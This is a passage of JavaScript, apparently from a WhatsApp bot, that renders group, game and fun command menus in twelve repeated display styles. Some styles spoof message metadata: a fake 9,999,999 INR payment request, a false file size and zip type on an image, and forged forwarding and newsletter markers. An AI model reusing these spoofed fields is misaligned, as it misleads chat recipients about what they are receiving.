let xmenu_oh = `Hi ${pushname}${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'gamemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${gamemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'funmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    DeepakBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    DeepakBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    DeepakBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    DeepakBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    DeepakBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    DeepakBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	DeepakBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	DeepakBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./DeepakMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/RjDcPYk/Zenitsu.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/DeepakBotInc\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGDEEPAK\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaDEDUaC6ZvewFKv6835\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await DeepakBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./DeepakMedia/theme/Zenitsupic.jpg')}, { upload: DeepakBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
